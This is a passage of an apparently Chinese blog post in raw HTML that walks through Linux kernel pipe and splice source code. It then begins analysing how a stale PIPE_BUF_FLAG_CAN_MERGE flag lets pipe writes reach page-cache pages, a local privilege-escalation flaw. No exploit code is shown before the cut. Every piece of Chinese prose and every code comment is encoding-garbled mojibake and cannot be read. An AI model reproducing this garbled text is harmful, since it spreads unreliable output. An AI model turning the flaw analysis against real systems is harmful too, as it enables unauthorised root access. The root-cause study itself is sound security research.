class="hljs-comment">//ç­‰å¾…ç®¡é“æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥å†™å…¥æ•°æ®</span><br>ret = wait_for_space(opipe, flags);<br><span class="hljs-keyword">if</span> (!ret) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_space;<br><br><span class="hljs-comment">/* Don&#x27;t try to read more the pipe has space for. */</span><br>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">             opipe-&gt;max_usage è¡¨ç¤ºç®¡é“çš„æœ€å¤§ä½¿ç”¨é‡ï¼Œå³ç®¡é“çš„æ€»å®¹é‡ã€‚</span><br><span class="hljs-comment">pipe_occupancy(opipe-&gt;head, opipe-&gt;tail) è¡¨ç¤ºå½“å‰ç®¡é“ä¸­å·²å ç”¨çš„ç©ºé—´ã€‚</span><br><span class="hljs-comment">é€šè¿‡è®¡ç®—å¯çŸ¥ï¼Œp_space è¡¨ç¤ºç®¡é“ä¸­çš„å‰©ä½™å¯ç”¨ç©ºé—´ï¼Œå³æ€»å®¹é‡å‡å»å·²å ç”¨çš„ç©ºé—´ã€‚</span><br><span class="hljs-comment">*/</span><br>p_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);<br>             <span class="hljs-comment">//å°†å†™å…¥æ•°æ®çš„é•¿åº¦é™åˆ¶ä¸ºå½“å‰ç®¡é“å‰©ä½™ç©ºé—´å’Œç»™å®šé•¿åº¦ len ä¸­çš„è¾ƒå°è€…ã€‚</span><br>len = <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);<br><br>ret = do_splice_to(in, &amp;offset, opipe, len, flags);<br>&#125;<br>        <span class="hljs-comment">//è§£é”</span><br>pipe_unlock(opipe);<br>        <br>        <span class="hljs-comment">//å¦‚æœå†™å…¥æˆåŠŸï¼ˆè¿”å›å€¼å¤§äº0ï¼‰ï¼Œåˆ™å”¤é†’ç®¡é“ä¸Šçš„è¯»å–è€…</span><br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>wakeup_pipe_readers(opipe);<br>        <span class="hljs-comment">//å¦‚æœæ²¡æœ‰æŒ‡å®šè¾“å…¥åç§»é‡ï¼Œåˆ™æ›´æ–°è¾“å…¥æ–‡ä»¶æè¿°ç¬¦çš„å½“å‰ä½ç½®</span><br><span class="hljs-keyword">if</span> (!off_in)<br>in-&gt;f_pos = offset;<br>        <span class="hljs-comment">//å¦‚æœæŒ‡å®šäº†è¾“å…¥åç§»é‡ï¼Œåˆ™å°†æœ€ç»ˆçš„åç§»é‡ä»å†…æ ¸ç©ºé—´æ‹·è´å›ç”¨æˆ·ç©ºé—´</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (copy_to_user(off_in, &amp;offset, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<br>ret = -EFAULT;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="ç®¡é“-ç®¡é“"><a href="#ç®¡é“-ç®¡é“" class="headerlink" title="ç®¡é“-&gt;ç®¡é“"></a>ç®¡é“-&gt;ç®¡é“</h3><p>å¹¶ä¸æ˜¯å¾ˆé‡è¦ï¼Œå°±æ”¾ä¸€è¾¹å§ğŸ˜‹</p><h4 id="splice-pipe-to-pipe"><a href="#splice-pipe-to-pipe" class="headerlink" title="splice_pipe_to_pipe"></a>splice_pipe_to_pipe</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Splice contents of ipipe to opipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">splice_pipe_to_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *ipipe,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> pipe_inode_info *opipe,</span><br><span class="hljs-params">       <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">ibuf</span>, *<span class="hljs-title">obuf</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head, o_head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_tail, o_tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_mask, o_mask;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-type">bool</span> input_wakeup = <span class="hljs-literal">false</span>;<br><br><br>retry:<br>ret = ipipe_prep(ipipe, flags);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br>ret = opipe_prep(opipe, flags);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Potential ABBA deadlock, work around it by ordering lock</span><br><span class="hljs-comment"> * grabbing by pipe info address. Otherwise two different processes</span><br><span class="hljs-comment"> * could deadlock (one doing tee from A -&gt; B, the other from B -&gt; A).</span><br><span class="hljs-comment"> */</span><br>pipe_double_lock(ipipe, opipe);<br><br>i_tail = ipipe-&gt;tail;<br>i_mask = ipipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>o_head = opipe-&gt;head;<br>o_mask = opipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-type">size_t</span> o_len;<br><br><span class="hljs-keyword">if</span> (!opipe-&gt;readers) &#123;<br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EPIPE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>i_head = ipipe-&gt;head;<br>o_tail = opipe-&gt;tail;<br><br><span class="hljs-keyword">if</span> (pipe_empty(i_head, i_tail) &amp;&amp; !ipipe-&gt;writers)<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Cannot make any progress, because either the input</span><br><span class="hljs-comment"> * pipe is empty or the output pipe is full.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (pipe_empty(i_head, i_tail) ||<br>    pipe_full(o_head, o_tail, opipe-&gt;max_usage)) &#123;<br><span class="hljs-comment">/* Already processed some buffers, break */</span><br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">if</span> (flags &amp; SPLICE_F_NONBLOCK) &#123;<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We raced with another reader/writer and haven&#x27;t</span><br><span class="hljs-comment"> * managed to process any buffers.  A zero return</span><br><span class="hljs-comment"> * value means EOF, so retry instead.</span><br><span class="hljs-comment"> */</span><br>pipe_unlock(ipipe);<br>pipe_unlock(opipe);<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br>ibuf = &amp;ipipe-&gt;bufs[i_tail &amp; i_mask];<br>obuf = &amp;opipe-&gt;bufs[o_head &amp; o_mask];<br><br><span class="hljs-keyword">if</span> (len &gt;= ibuf-&gt;len) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Simply move the whole buffer from ipipe to opipe</span><br><span class="hljs-comment"> */</span><br>*obuf = *ibuf;<br>ibuf-&gt;ops = <span class="hljs-literal">NULL</span>;<br>i_tail++;<br>ipipe-&gt;tail = i_tail;<br>input_wakeup = <span class="hljs-literal">true</span>;<br>o_len = obuf-&gt;len;<br>o_head++;<br>opipe-&gt;head = o_head;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get a reference to this pipe buffer,</span><br><span class="hljs-comment"> * so we can copy the contents over.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!pipe_buf_get(ipipe, ibuf)) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>*obuf = *ibuf;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Don&#x27;t inherit the gift and merge flags, we need to</span><br><span class="hljs-comment"> * prevent multiple steals of this page.</span><br><span class="hljs-comment"> */</span><br>obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_GIFT;<br>obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_CAN_MERGE;<br><br>obuf-&gt;len = len;<br>ibuf-&gt;offset += len;<br>ibuf-&gt;len -= len;<br>o_len = len;<br>o_head++;<br>opipe-&gt;head = o_head;<br>&#125;<br>ret += o_len;<br>len -= o_len;<br>&#125; <span class="hljs-keyword">while</span> (len);<br><br>pipe_unlock(ipipe);<br>pipe_unlock(opipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we put data in the output pipe, wakeup any potential readers.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>wakeup_pipe_readers(opipe);<br><br><span class="hljs-keyword">if</span> (input_wakeup)<br>wakeup_pipe_writers(ipipe);<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ–‡ä»¶-ç®¡é“"><a href="#æ–‡ä»¶-ç®¡é“" class="headerlink" title="æ–‡ä»¶-&gt;ç®¡é“"></a>æ–‡ä»¶-&gt;ç®¡é“</h3><h4 id="do-splice-to"><a href="#do-splice-to" class="headerlink" title="do_splice_to"></a>do_splice_to</h4><p>åœ¨ <code>do_splice_to</code> ä¸­æœ€ç»ˆä¼šè°ƒç”¨åˆ°å†…æ ¸æ–‡ä»¶ç»“æ„ä½“å‡½æ•°è¡¨çš„ <code>splice_read</code> æŒ‡é’ˆï¼Œå¯¹äºä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿè€Œè¨€è¯¥å‡½æ•°æŒ‡é’ˆä¸åŒï¼Œä»¥ ext4 æ–‡ä»¶ç³»ç»Ÿä¸ºä¾‹ï¼ŒæŸ¥è¡¨ <code>ext4_file_operations</code>ï¼Œå¯¹åº”è°ƒç”¨çš„å‡½æ•°åº”ä¸º <code>generic_file_splice_read</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from a file to a pipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_to</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> *ppos,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">size_t</span> len,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ)))<br><span class="hljs-keyword">return</span> -EBADF;<br><span class="hljs-comment">//éªŒè¯æºæ–‡ä»¶æ˜¯å¦å…·æœ‰è¯»å– len å­—èŠ‚æ•°æ®çš„æƒé™</span><br>ret = rw_verify_area(READ, in, ppos, len);<br><span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-keyword">if</span> (unlikely(len &gt; MAX_RW_COUNT))<br>len = MAX_RW_COUNT;<br><br><span class="hljs-keyword">if</span> (in-&gt;f_op-&gt;splice_read)<br><span class="hljs-keyword">return</span> in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);<br><span class="hljs-keyword">return</span> default_file_splice_read(in, ppos, pipe, len, flags);<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="generic-file-splice-read"><a href="#generic-file-splice-read" class="headerlink" title="generic_file_splice_read"></a>generic_file_splice_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">generic_file_splice_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> *ppos,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">size_t</span> len,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">to</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head;<br><span class="hljs-type">int</span> ret;<br><span class="hljs-comment">//åˆå§‹åŒ– to è¿­ä»£å™¨ï¼Œå°†ç®¡é“çš„è¯»æ“ä½œè®¾ç½®åˆ° to è¿­ä»£å™¨ä¸­ï¼ŒåŒæ—¶è®¾ç½®ç¼“å†²åŒºé•¿åº¦ä¸º len</span><br>iov_iter_pipe(&amp;to, READ, pipe, len);<br>i_head = to.head;<br>    <span class="hljs-comment">//åˆå§‹åŒ– kiocb å¼‚æ­¥I/Oæ§åˆ¶å—ï¼Œä½¿ç”¨ç»™å®šçš„æ–‡ä»¶æŒ‡é’ˆ in</span><br>init_sync_kiocb(&amp;kiocb, in);<br>kiocb.ki_pos = *ppos;<br>    <br>    <span class="hljs-comment">//è°ƒç”¨ call_read_iter å‡½æ•°ï¼Œä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®åˆ°ç®¡é“ã€‚è¿™é‡Œå®é™…ä¸Šæ˜¯è°ƒç”¨äº†æ–‡ä»¶çš„ read_iter æ“ä½œï¼Œå¹¶å°†è¯»å–çš„æ•°æ®å†™å…¥åˆ°ç®¡é“ä¸­ã€‚</span><br>ret = call_read_iter(in, &amp;kiocb, &amp;to);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>*ppos = kiocb.ki_pos;<br>file_accessed(in);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>to.head = i_head;<br>to.iov_offset = <span class="hljs-number">0</span>;<br>iov_iter_advance(&amp;to, <span class="hljs-number">0</span>); <span class="hljs-comment">/* to free what was emitted */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * callers of -&gt;splice_read() expect -EAGAIN on</span><br><span class="hljs-comment"> * &quot;can&#x27;t put anything in there&quot;, rather than -EFAULT.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ret == -EFAULT)<br>ret = -EAGAIN;<br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ext4æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œread_iterå…¶å®ä¸º<code>shmem_file_read_iter</code>ï¼Œè¿™Bå‡½æ•°è°ƒç”¨é“¾æœ‰ç‚¹å°é•¿ï¼Œè´´ä¸ªè°ƒç”¨é“¾å…ˆ</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">shmem_file_read_iter<br>shmem_getpageï¼›æ ¹æ®æ–‡ä»¶ç´¢å¼•è·å–é¡µæ¡†<br>copy_page_to_iterï¼›å°†é¡µæ¡†æ•°æ®å¤åˆ¶åˆ°ç›®æ ‡ç¼“å†²åŒºä¸­<br><span class="hljs-built_in">copy_page_to_iter_pipe</span>()ï¼›å¦‚æœç›®æ ‡ç¼“å†²åŒºæ˜¯ç®¡é“è¿­ä»£å™¨ï¼Œå°†æ•°æ®å¤åˆ¶åˆ°ç®¡é“ç¼“å†²åŒºä¸­<br></code></pre></td></tr></table></figure><h4 id="copy-page-to-iter-pipe"><a href="#copy-page-to-iter-pipe" class="headerlink" title="copy_page_to_iter_pipe"></a>copy_page_to_iter_pipe</h4><p>æœ€ç»ˆåœ¨ <code>copy_page_to_iter_pipe()</code> ä¸­ï¼Œå°†å¯¹åº”çš„ <code>pipe_buffer-&gt;page</code> è®¾ä¸º<strong>æ–‡ä»¶æ˜ å°„çš„é¡µé¢é›†çš„å¯¹åº”é¡µæ¡†</strong>ï¼Œå°†é¡µæ¡†å¼•ç”¨è®¡æ•° + 1ï¼ˆ<code>get_page()</code>ï¼‰ï¼Œè¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ª<strong>ä»æ–‡ä»¶è¯»å–æ•°æ®åˆ°ç®¡é“çš„è¿‡ç¨‹</strong>ï¼Œå› ä¸ºæ˜¯ç›´æ¥å»ºç«‹é¡µé¢çš„æ˜ å°„ï¼Œæ‰€ä»¥æ¯æ¬¡æ“ä½œåéƒ½ä¼šå°† <code>head +1</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br><span class="hljs-type">size_t</span> off;<br><br><span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br>bytes = i-&gt;count;<br><br><span class="hljs-keyword">if</span> (unlikely(!bytes))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!sanity(i))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br><span class="hljs-comment">//offæ˜¯NULLåº”è¯¥ğŸ¤”</span><br>off = i-&gt;iov_offset;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br><span class="hljs-keyword">if</span> (off) &#123;<br><span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br><span class="hljs-comment">/* merge with the last one */</span><br>buf-&gt;len += bytes;<br>i-&gt;iov_offset += bytes;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>i_head++;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>get_page(page);<br>buf-&gt;page = page;<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br><br>pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>i-&gt;iov_offset = offset + bytes;<br>i-&gt;head = i_head;<br>out:<br>i-&gt;count -= bytes;<br><span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>PSï¼šæ­¤å¤„å¹¶æ²¡æœ‰å¯¹pipe_buffer-&gt;flagsçš„è®¾ç½®æ“ä½œ</strong></p><h3 id="ç®¡é“-æ–‡ä»¶"><a href="#ç®¡é“-æ–‡ä»¶" class="headerlink" title="ç®¡é“-&gt;æ–‡ä»¶"></a>ç®¡é“-&gt;æ–‡ä»¶</h3><h4 id="do-splice-from"><a href="#do-splice-from" class="headerlink" title="do_splice_from"></a>do_splice_from</h4><p><code>do_splice_from</code> æœ€ç»ˆä¼šæ ¹æ®æ‰€æ“ä½œçš„æ–‡ä»¶çš„å±æ€§è°ƒç”¨ç›¸åº”çš„å†…æ ¸æ–‡ä»¶ç»“æ„ä¸­çš„ <code>splice_write()</code> å‡½æ•°æŒ‡é’ˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from pipe to file.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_from</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-keyword">struct</span> file *out,</span><br><span class="hljs-params">   <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (out-&gt;f_op-&gt;splice_write)<br><span class="hljs-keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);<br><span class="hljs-keyword">return</span> default_file_splice_write(pipe, out, ppos, len, flags);<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="iter-file-splice-write"><a href="#iter-file-splice-write" class="headerlink" title="iter_file_splice_write"></a>iter_file_splice_write</h4><p>åœ¨<strong>ext4</strong>æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªå‡½æ•°æŒ‡é’ˆæ˜¯<code>iter_file_splice_write</code>ï¼Œæœ€ç»ˆä¼šè°ƒç”¨å¦‚ä¸‹å‡½æ•°</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">iter_file_splice_write<br>splice_from_pipe_next <span class="hljs-comment">;æ£€æŸ¥ç®¡é“å¯ç”¨æ€§</span><br>vfs_iter_write <span class="hljs-comment">;å°†è¯»å–çš„æ•°æ®å†™å…¥ç›®æ ‡æ–‡ä»¶</span><br>do_iter_write<br>do_iter_readv_writev<br> call_write_iter<br> generic_file_write_iter <span class="hljs-comment">;åé¢è¿˜æœ‰ï¼Œä½†åº”è¯¥å°±æ˜¯æ™®é€šçš„æ‹·è´æ•°æ®ä¹‹ç±»çš„</span><br></code></pre></td></tr></table></figure><h1 id="0x03ï¼šæ¼æ´åˆ†æ"><a href="#0x03ï¼šæ¼æ´åˆ†æ" class="headerlink" title="0x03ï¼šæ¼æ´åˆ†æ"></a>0x03ï¼šæ¼æ´åˆ†æ</h1><p>æˆ‘ä»¬ç°åœ¨çŸ¥é“ä»¥ä¸‹å‡ ç‚¹</p><ul><li><strong>PIPE_BUF_FLAG_CAN_MERGE</strong>æ˜¯<code>pipe_buffer-&gt;page</code>æ˜¯å¦èƒ½å†™å…¥çš„æ ‡å¿—</li><li><code>pipe_write</code>ä¸­ä¼šå°†<code>pipe_buffer-&gt;flags</code>è®¾ç½®æˆ<strong>PIPE_BUF_FLAG_CAN_MERGE</strong></li><li><code>pipe_read</code>ä¸­è¯»å–å®Œæˆå<code>free</code>è¿™äº›<code>page</code>å¹¶ä¸ä¼šæŠŠ<code>flags</code>ç½®0</li><li>ä»æ–‡ä»¶å¤åˆ¶åˆ°ç®¡é“ä¸­<code>copy_page_to_iter_pipe</code>ä¸­<code>get_page</code>ä¸ä¼šé‡æ–°è®¾ç½®<code>flags</code>ï¼Œå› 